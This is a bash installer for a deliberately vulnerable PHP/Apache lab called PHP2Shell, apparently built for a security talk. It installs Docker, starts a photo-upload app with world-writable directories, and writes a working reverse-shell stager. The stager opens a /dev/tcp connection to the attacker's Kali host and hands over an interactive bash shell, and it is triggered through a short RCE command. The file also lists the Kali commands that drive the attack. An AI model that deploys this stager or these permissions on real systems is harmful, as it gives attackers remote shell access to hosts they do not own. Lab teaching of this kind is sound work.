#!/usr/bin/env bash
#
# PHP2Shell — lab installer for Ubuntu Server 24.04 (the vulnerable target).
# Lab, app and stager written by r19.
#
#   sudo ./install.sh --lhost 192.0.2.10
#   sudo ./install.sh --lhost 192.0.2.10 --lport 4444 --port 8080
#
# What it does, in order:
#   1. checks root, Ubuntu and architecture (amd64/aarch64);
#   2. installs Docker Engine + Compose v2 (docker.io + docker-compose-v2);
#   3. pulls php:8.5.11-apache (the build with a verified RCE profile);
#   4. prepares the app: storage/, stage/ and the stager with the Kali IP baked in;
#   5. starts the container with php.ini and the single-worker Apache;
#   6. opens the port in ufw (when ufw is active);
#   7. runs verify.sh and prints the next steps.
#
# This host is vulnerable on purpose. Run it on an isolated network only and tear
# it down with ./uninstall.sh when the talk is over.

set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
APACHE_PORT="8080"
LHOST=""
LPORT="4444"

die() { printf '\n[!] %s\n' "$1" >&2; exit 1; }
say() { printf '\n[*] %s\n' "$1"; }
ok()  { printf '    ok  %s\n' "$1"; }

usage() {
    cat <<'EOF'
Usage: sudo ./install.sh --lhost <KALI-IP> [options]

  --lhost <ip>     Kali IP that will receive the reverse shell (required;
                   on Kali find it with: hostname -I | awk '{print $1}')
  --lport <port>   listener port on Kali (default: 4444)
  --port  <port>   port published by Apache (default: 8080)
  -h, --help       this help

Re-running with another --lhost only rewrites the stager (it is idempotent).
EOF
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --lhost)   LHOST="${2:-}"; shift 2 ;;
        --lport)   LPORT="${2:-}"; shift 2 ;;
        --port)    APACHE_PORT="${2:-}"; shift 2 ;;
        -h|--help) usage; exit 0 ;;
        *) die "unknown argument: $1 (use --help)" ;;
    esac
done

[[ -n "$LHOST" ]] || die "Kali IP is required: --lhost (e.g. sudo ./install.sh --lhost 192.0.2.10)"
[[ "$LHOST" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]] || die "--lhost must be an IPv4 address (got: $LHOST)"
[[ "$LPORT" =~ ^[0-9]+$ ]] || die "--lport must be numeric"
[[ "$APACHE_PORT" =~ ^[0-9]+$ ]] || die "--port must be numeric"

# --- 1. host ---------------------------------------------------------------
[[ $EUID -eq 0 ]] || die "run as root: sudo ./install.sh --lhost $LHOST"

if [[ -r /etc/os-release ]]; then
    # shellcheck disable=SC1091
    . /etc/os-release
    [[ "${ID:-}" == "ubuntu" ]] || die "this installer targets Ubuntu (detected: ${ID:-unknown})"
    echo "[*] host: ${PRETTY_NAME:-Ubuntu}"
    case "${VERSION_ID:-}" in
        24.04) ;;
        *) echo "[!] warning: validated on 24.04; you are on ${VERSION_ID:-?}. Continuing anyway." ;;
    esac
fi

arch="$(uname -m)"
case "$arch" in
    x86_64|aarch64) ok "architecture: $arch" ;;
    *) die "no toolkit profile for this architecture: $arch (use amd64 or aarch64)" ;;
esac

# --- 2. docker -------------------------------------------------------------
export DEBIAN_FRONTEND=noninteractive

# A minimal Ubuntu Server install may ship without curl.
if ! command -v curl >/dev/null 2>&1; then
    say "installing curl and ca-certificates (clean machine)"
    apt-get update -qq
    apt-get install -y -qq curl ca-certificates
fi

if ! command -v docker >/dev/null 2>&1; then
    say "installing Docker Engine + Compose v2 (docker.io, docker-compose-v2)"
    apt-get update -qq
    apt-get install -y -qq docker.io docker-compose-v2
else
    ok "Docker already installed: $(docker --version)"
fi

# Docker present but without the compose plugin (partial install).
if ! docker compose version >/dev/null 2>&1 && ! command -v docker-compose >/dev/null 2>&1; then
    say "installing the docker compose plugin"
    apt-get install -y -qq docker-compose-v2 || true
fi

systemctl enable --now docker >/dev/null 2>&1 || true

if docker info >/dev/null 2>&1; then
    :
else
    die "the Docker daemon did not answer (try: systemctl status docker)"
fi

if docker compose version >/dev/null 2>&1; then
    COMPOSE=(docker compose)
elif command -v docker-compose >/dev/null 2>&1; then
    COMPOSE=(docker-compose)
else
    die "docker compose (v2) is not available. Install the docker-compose-v2 package."
fi
ok "compose: $("${COMPOSE[@]}" version 2>/dev/null | head -n1)"

compose() { ( cd "$ROOT/docker" && "${COMPOSE[@]}" "$@" ); }

# --- 3. image --------------------------------------------------------------
if docker image inspect php:8.5.11-apache >/dev/null 2>&1; then
    ok "image php:8.5.11-apache already present"
else
    say "pulling php:8.5.11-apache (~500 MB, build with a verified profile)"
    docker pull php:8.5.11-apache
fi

# --- 4. application, storage and stager ------------------------------------
say "preparing the application"

mkdir -p "$ROOT/storage" "$ROOT/app/stage" "$ROOT/app/assets"
chmod 0777 "$ROOT/storage"

# Uploads live outside the docroot; the docroot itself must be writable because
# that is where (Apache's CWD) the `id>p1` proof writes the file fetched over HTTP.
chmod 0777 "$ROOT/app"
chmod 0755 "$ROOT/app/stage"
chmod 0644 "$ROOT/app"/*.php "$ROOT/app/assets"/* 2>/dev/null || true

# The RCE primitive carries at most 14 bytes of command. `sh stage/s` is 10 and
# fits; the reverse shell itself comes from this pre-positioned stager. It is
# payload, not exploit: a real campaign would use the same channel to fetch the
# next stage.
cat > "$ROOT/app/stage/s" <<EOF
#!/bin/sh
# PHP2Shell lab — reverse-shell stager. Written by r19.
# Generated by install.sh at $(date -u '+%Y-%m-%dT%H:%M:%SZ') for ${LHOST}:${LPORT}.
# The attack runs: sh stage/s   (10 bytes; carrier limit: 14)
#
# Every step is logged twice: /tmp/p2s-stager.log (read with docker exec) and
# /var/www/html/p2s-stage.log, which the driver fetches over HTTP. The RCE
# command returns no output, so this log is the only proof that the stager ran
# and whether the callback reached the listener:
#
#   stager: ... pid=33 uid=33 ...          the stager executed
#   stager: ... connect-ok uid=33         the listener accepted the TCP connection
#   stager: ... connect-fail              Kali refused / unreachable
#
# It exits immediately after spawning the background process: the Apache worker
# must be freed, otherwise the exploit request hangs until the timeout.

LHOST="${LHOST}"
LPORT="${LPORT}"
WEB=/var/www/html/p2s-stage.log
LOG=/tmp/p2s-stager.log

log() {
    line="stager: \$(date -u '+%Y-%m-%dT%H:%M:%SZ') \$*"
    echo "\$line" >> "\$LOG" 2>/dev/null
    echo "\$line" >> "\$WEB" 2>/dev/null
}

log "pid=\$\$ uid=\$(id -u) cwd=\$(pwd) lhost=\$LHOST lport=\$LPORT"

if [ -x /bin/bash ]; then
    # The connection is opened once, then the interactive shell inherits it —
    # no second connect, and connect-ok means the listener really accepted.
    # The literal log path is repeated inside the child on purpose: the child is
    # a new shell, so the parent's variables are not visible there.
    setsid /bin/bash -c '
        L=/var/www/html/p2s-stage.log
        if exec 3<>/dev/tcp/${LHOST}/${LPORT}; then
            echo "stager: \$(date -u +%Y-%m-%dT%H:%M:%SZ) connect-ok uid=\$(id -u)" >> "\$L" 2>/dev/null
            exec /bin/bash -i <&3 >&3 2>&3
        else
            echo "stager: \$(date -u +%Y-%m-%dT%H:%M:%SZ) connect-fail lhost=${LHOST} lport=${LPORT}" >> "\$L" 2>/dev/null
            exit 1
        fi
    ' </dev/null >/dev/null 2>&1 &
    log "bash launched in background"
    exit 0
fi

log "/bin/bash missing — no fallback"
exit 1
EOF

chmod 0755 "$ROOT/app/stage/s"
ok "stager: app/stage/s -> ${LHOST}:${LPORT}"

# Published port (read by compose through docker/.env).
printf 'P2S_PORT=%s\n' "$APACHE_PORT" > "$ROOT/docker/.env"
ok "published port: ${APACHE_PORT}/tcp"

# --- 5. bring the lab up ---------------------------------------------------
say "starting the container"
compose down >/dev/null 2>&1 || true
compose up -d

say "waiting for Apache to answer"
ready=0
for _ in $(seq 1 40); do
    if curl -fsS --max-time 2 "http://127.0.0.1:${APACHE_PORT}/" >/dev/null 2>&1; then
        ready=1
        break
    fi
    sleep 1
done
[[ $ready -eq 1 ]] || { compose logs --tail 40 || true; die "the target did not answer on http://127.0.0.1:${APACHE_PORT}/"; }
ok "Apache responding"

# --- 6. firewall -----------------------------------------------------------
if command -v ufw >/dev/null 2>&1 && ufw status 2>/dev/null | grep -qi '^Status: active'; then
    say "opening ${APACHE_PORT}/tcp in ufw"
    ufw allow "${APACHE_PORT}/tcp" >/dev/null
    ok "ufw: ${APACHE_PORT}/tcp allowed"
fi

# --- 7. validation ---------------------------------------------------------
say "validating the installation"
bash "$ROOT/verify.sh" || echo "[!] verify.sh reported problems — see docs/TROUBLESHOOTING.md"

IP="$(hostname -I 2>/dev/null | awk '{print $1}')"
[[ -n "$IP" ]] || IP="<this-host-IP>"

cat <<EOF

────────────────────────────────────────────────────────────────────
Lab is up.

  Target (Ubuntu)  http://${IP}:${APACHE_PORT}/
  Application      Photo Drop  (upload + gallery + download)
  Diagnostics      http://${IP}:${APACHE_PORT}/ping.php
  Image            php:8.5.11-apache   (Apache prefork, 1 worker)
  Reverse shell    ${LHOST}:${LPORT}   (the listener runs on Kali)

On Kali (from the ubuntu-lab/ folder):

  ./kali/setup-kali.sh                                     # once
  ./kali/p2s-listen.sh --lport ${LPORT}                    # pane 1
  ./kali/p2s-run.sh --target http://${IP}:${APACHE_PORT} --step proof
  ./kali/p2s-run.sh --target http://${IP}:${APACHE_PORT} --step shell

If something stops answering (the chain kills the Apache child):

  cd ${ROOT}/docker && sudo ${COMPOSE[*]} restart

Tear down at the end:  sudo ${ROOT}/uninstall.sh --purge
────────────────────────────────────────────────────────────────────
EOF
